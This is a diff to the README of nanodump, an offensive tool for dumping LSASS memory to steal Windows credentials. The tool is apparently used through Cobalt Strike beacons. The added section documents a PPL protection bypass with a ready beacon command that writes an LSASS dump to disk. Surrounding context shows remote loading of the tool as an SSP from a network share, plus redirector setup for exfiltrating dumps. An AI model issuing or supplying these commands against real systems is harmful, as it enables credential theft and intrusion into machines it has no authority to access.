@@ -2,7 +2,7 @@
 
 A flexible tool that creates a minidump of the LSASS process.
 
-![screenshot](demo.png)
+![screenshot](resources/demo.png)
 
 <h2>Table of contents</h2>
 
@@ -15,6 +15,7 @@ A flexible tool that creates a minidump of the LSASS process.
   <li><a href="#malseclogon">MalSecLogon</a></li>
   <li><a href="#malseclogon-and-duplicate">MalSecLogon and handle duplication</a></li>
   <li><a href="#ssp">Load nanodump as an SSP</a></li>
+  <li><a href="#ppl">PPL bypass</a></li>
   <li><a href="#params">Parameters</a></li>
   <li><a href="#examples">Examples</a></li>
   <li><a href="#redirectors">HTTPS redirectors</a></li>
@@ -36,6 +37,7 @@ A flexible tool that creates a minidump of the LSASS process.
   <li>Supports snapshots.</li> 
   <li>Supports handle duplication.</li> 
   <li>Supports MalSecLogon.</li> 
+  <li>Supports the PPL userland exploit.</li> 
   <li>You can load nanodump in LSASS as a Security Support Provider (SSP).</li> 
   <li>You can use the .exe version to run <b>nanodump</b> outside of Cobalt Strike :smile:.</li> 
 </ul>
@@ -150,8 +152,16 @@ beacon> load_ssp \\10.10.10.10\openShare\ssp.dll
 ```
 
 
+<h2 id="ppl">9. PPL bypass</h2>
+If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk.  
 
-<h2 id="params">9. Parameters</h2>
+To access this feature, use the `nanodump_ppl` command
+```
+beacon> nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
+```
+
+
+<h2 id="params">10. Parameters</h2>
 
 #### --getpid
 Get PID of LSASS and leave.  
@@ -185,7 +195,7 @@ Path to a binary such as `C:\Windows\notepad.exe`.
 This option is used exclusively with `--malseclogon` and `--dup`. 
 
 
-<h2 id="examples">10. Examples</h2>
+<h2 id="examples">11. Examples</h2>
 
 Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
 ```
@@ -228,7 +238,7 @@ Load nanodump in LSASS as an SSP remotely:
 beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
 ```
 
-<h2 id="redirectors">11. HTTPS redirectors</h2>
+<h2 id="redirectors">12. HTTPS redirectors</h2>
 
 If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
 Increase the max size of requests on your web server to allow nanodump to download the dump.
@@ -255,3 +265,5 @@ location ~ ^...$ {
 - [Antonio Cocomazzi](https://twitter.com/splinter_code) for [MalSecLogon](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
 - [xpn](https://twitter.com/_xpn_) for [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)
 - [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
+- [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
+- [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
